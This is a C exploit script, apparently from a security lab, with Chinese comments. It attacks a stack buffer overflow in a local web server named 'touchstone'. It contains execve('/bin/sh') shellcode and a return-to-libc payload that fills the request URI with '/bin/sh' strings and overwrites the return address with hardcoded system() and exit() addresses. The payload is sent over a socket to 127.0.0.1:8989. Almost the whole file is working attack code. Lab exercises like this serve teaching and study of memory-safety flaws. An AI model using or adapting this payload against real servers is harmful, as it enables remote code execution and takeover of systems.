
/**
 *  运行touchstone时要关闭内存地址随机化，
 *  且touchstone编译时要加上-z execstack -fn-stack-protector
*/





#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/shm.h>
#define NOP 0x90
#define PORT  8989
int browser(int port,int stringaddr);
/*
** construct your shellcode
**create_shellcode.c will help you to create a shellcode.
**fill in it there	 
*/
  const char shellcode[] = "\x31\xc0"
  "\x50"
  "\x68""//sh"
  "\x68""/bin"
  "\x89\xe3"
  "\x50"
  "\x53"
  "\x89\xe1"
  "\x99"
  "\xb0\x0b"
  "\xcd\x80" ;
  
  
  
 int main(int argc,char *argv[])
 {
   int port=PORT,addr=0xbf89ba38;
  // printf("%x\n",&port);
   if(argc>1) port=atoi(argv[1]);
 // for(addr=0xbfdbf8d8;addr<=0xc0000000;addr++)
 //httpd的环境变量地址每次都在变，不可能通过暴力破解来猜到/bin/bash的地址
 //所以我们要把system的参数放在栈中，重生的栈地址不变，只有在第一次创建进程时栈地址不可预测
        browser(port,addr);
   
 }
int browser(int port,int stringaddr)
{
  
  int sock_client = socket(AF_INET,SOCK_STREAM, 0);//sock fd
   struct sockaddr_in addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);  //server port
  
  addr.sin_addr.s_addr = inet_addr("127.0.0.1");  ///server ip address

  
  if (connect(sock_client, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    {
      perror("connect");
      exit(1);
    }
 
  printf("stack address = %x\n",stringaddr);
  char uri[2000];
  long *addr_s;
  int i;

  addr_s=(long *)uri;
for(i=0;i<1060;i++)
{
     uri[i++]='/';
     uri[i++]='b';
     uri[i++]='i';
     uri[i++]='n';
     uri[i++]='/';
     uri[i++]='s';
     uri[i++]='h';//将/bin/sh写入栈中，作为system的参数
     uri[i]  ='\0';
}
	 addr_s[265]=0xb7648060;//0xb7e5f060;      //system的地址
	 addr_s[266]=0xb763bbe0;      //exit的地址
         addr_s[267]= stringaddr;     //system的地址参数的地址0xbffff591 是台式机上虚拟机的地址
     	 uri[1073]='\0';
         uri[1072]=' ';
         write(sock_client,uri,1073);    
         printf("%s\n",uri);
// char resp[1024];
// int num = 0;
// while(read (sock_client, &resp[num], 1))
//	num++;
//  resp[num] = 0;
//  printf("Response = %s\n",resp);
         close(sock_client);
//  printf("have closed socket\n");
  return 0;
}
